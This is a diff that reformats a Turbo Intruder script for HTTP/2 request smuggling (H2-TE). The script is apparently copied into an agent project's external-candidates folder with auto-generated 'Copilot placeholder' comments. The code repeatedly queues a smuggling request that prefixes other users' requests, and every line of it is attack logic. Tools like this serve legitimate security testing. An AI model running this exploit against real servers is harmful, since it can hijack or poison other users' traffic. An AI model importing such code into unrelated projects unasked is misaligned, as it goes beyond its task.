@@ -1,38 +1,27 @@
-# Extracted from: C:\DEV\PyAgent\src\external_candidates\auto\chunk_0_H2_TE.py
+# Refactored by Copilot placeholder
+# Refactored by Copilot placeholder
 # Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-http-request-smuggler\resources\H2-TE.py
 # NOTE: extracted with static-only rules; review before use
 
+
 def queueRequests(target, wordlists):
 
-    engine = RequestEngine(endpoint=target.endpoint,
-
-                           concurrentConnections=5,
-
-                           engine=Engine.BURP2,
-
-                           maxRetriesPerRequest=0
-
-                           )
+    engine = RequestEngine(
+        endpoint=target.endpoint, concurrentConnections=5, engine=Engine.BURP2, maxRetriesPerRequest=0
+    )
 
     engine.start()
 
-
-
     # This will prefix the victim's request. Edit it to achieve the desired effect.
 
-    prefix = '''GET /robots.txt HTTP/1.1
+    prefix = """GET /robots.txt HTTP/1.1
 
-X-Ignore: X'''
-
-
+X-Ignore: X"""
 
     # HTTP uses \r\n for line-endings. Linux uses \n so we need to normalise
 
-    if '\r' not in prefix:
-
-        prefix = prefix.replace('\n', '\r\n')
-
-
+    if "\r" not in prefix:
+        prefix = prefix.replace("\n", "\r\n")
 
     # The request engine will auto-fix the content-length for us
 
@@ -40,16 +29,10 @@ X-Ignore: X'''
 
     victim = target.req
 
-
-
     while True:
-
-
-
         engine.queue(attack)
 
         for i in range(4):
-
             engine.queue(victim)
 
             time.sleep(0.05)
@@ -57,10 +40,6 @@ X-Ignore: X'''
         time.sleep(1)
 
 
-
-
-
 def handleResponse(req, interesting):
 
     table.add(req)
-
